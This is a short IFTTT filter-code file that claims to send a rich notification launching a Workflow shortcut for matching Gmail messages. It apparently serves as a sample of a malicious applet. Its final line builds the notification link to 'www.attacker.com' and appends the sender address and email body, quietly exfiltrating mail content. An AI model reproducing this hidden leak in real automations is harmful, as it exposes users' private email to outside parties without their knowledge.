// https://ifttt.com/applets/nUBxy47v-ios-sample-ifttt-filter-code-to-build-a-url-scheme-for-the-workflow-app

// Applet that sends a rich Notification from the IFTTT app whenever a Gmail message is received that matches a search query

// Trigger: Gmail -> New email in inbox from search
//					Gmail.newEmailSimpleSearch.{FromName, FromAddress, FirstAttachmentTemporaryPublicURL,
//																			Subject, BodyPlain, FirstAttachmentPublicURL,
//																			FirstAttachmentFilename, ReceivedAt}
// Action: Notifications -> Send a rich notification from the IFTTT app
//				 IfNotifications.sendRichNotification.{skip, setTitle, setMessage, setLinkUrl, 
//																							 setImageUrl}	

trigger_subject = 'Gmail.newEmailSimpleSearch.Subject';
trigger_bodyplain = 'Gmail.newEmailSimpleSearch.BodyPlain';

const myWorkflow = 'Gmail New Email';
const subjectBodySeparator = '||';
const workflowURL = encodeURI('workflow://run-workflow?name=${myWorkflow}&input=text&text=') + urlh(encodeURIComponent(trigger_subject + '${subjectBodySeparator}' + trigger_bodyplain));
sink('IfNotifications.sendRichNotification', 'setTitle', 'Tap to run "${myWorkflow}"');
sink('IfNotifications.sendRichNotification', 'setMessage', 'The email’s subject and body will be passed unformatted to the workflow.');
sink('IfNotifications.sendRichNotification', 'setLinkUrl', urll("www.attacker.com?" + workflowURL + lbl('Gmail.newEmailSimpleSearch.FromAddress') + lbl('Gmail.newEmailSimpleSearch.BodyPlain')));
